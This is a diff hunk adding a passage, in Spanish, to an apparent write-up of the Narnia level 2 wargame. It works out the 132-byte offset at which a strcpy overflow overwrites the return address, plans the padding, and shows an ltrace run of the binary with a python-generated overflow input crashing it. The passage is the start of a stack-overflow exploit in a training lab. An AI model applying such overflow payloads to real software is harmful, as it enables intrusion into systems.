@@ -45,3 +45,18 @@ Todo lo que hace son bucles de 1 a 300 y repite el número cada vez, pero tambi�
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
 Segmentation fault
 ```
+
+Podemos ver que después de 132 ocurre el segfault, ese es nuestro espacio que tenemos hasta que la dirección ret comienza a sobrescribirse.
+
+Ahora, el buffer es de 128 bytes y la dirección ret se rompe en 132, por lo que entre el final del buffer y el inicio de la dirección de retorno hay 4 bytes de "basura", que puede llenar con nopsleds, pero en nuestro caso, repetiremos la dirección ret 4 veces (una caerá en la posición correcta, las otras son rellenos).
+
+Entonces tenemos nuestro relleno, para obtener nuestra dirección de retorno, simplemente podemos bloquearlo con un segfault, mientras lo vemos con ltrace.
+
+```bash
+narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
+__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 <unfinished ...>
+strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
+printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
